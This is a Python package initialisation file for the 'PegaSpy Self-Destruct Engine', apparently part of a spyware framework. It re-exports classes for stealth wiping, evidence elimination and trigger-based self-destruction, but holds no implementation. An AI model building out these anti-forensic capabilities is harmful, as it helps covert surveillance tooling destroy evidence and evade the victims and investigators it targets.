#!/usr/bin/env python3
"""
PegaSpy Self-Destruct Engine
Provides stealthy self-destruction capabilities for the framework.
"""

from .destruction_engine import (
    DestructionEngine,
    DestructionTrigger,
    DestructionMethod,
    DestructionScope,
    TriggerCondition,
    DestructionTask,
    DestructionResult
)

from .stealth_wiper import (
    StealthWiper,
    WipeMethod,
    WipeTarget,
    WipeStatus,
    WipeTask,
    WipeStatistics
)

from .evidence_eliminator import (
    EvidenceEliminator,
    EvidenceType,
    EliminationMethod,
    EvidenceTarget,
    EliminationStatus,
    EliminationStatistics
)

from .trigger_manager import (
    TriggerManager,
    TriggerType,
    TriggerEvent,
    TriggerCondition as TriggerCond,
    TriggerStatus,
    TriggerPriority,
    TriggerRule
)

__all__ = [
    'DestructionEngine',
    'DestructionTrigger',
    'DestructionMethod',
    'DestructionScope',
    'TriggerCondition',
    'DestructionTask',
    'DestructionResult',
    'StealthWiper',
    'WipeMethod',
    'WipeTarget',
    'WipeStatus',
    'WipeTask',
    'WipeStatistics',
    'EvidenceEliminator',
    'EvidenceType',
    'EliminationMethod',
    'EvidenceTarget',
    'EliminationStatus',
    'EliminationStatistics',
    'TriggerManager',
    'TriggerType',
    'TriggerEvent',
    'TriggerCond',
    'TriggerStatus',
    'TriggerPriority',
    'TriggerRule'
]

__version__ = "1.0.0"
__author__ = "PegaSpy Development Team"
__description__ = "Advanced self-destruct capabilities for PegaSpy framework"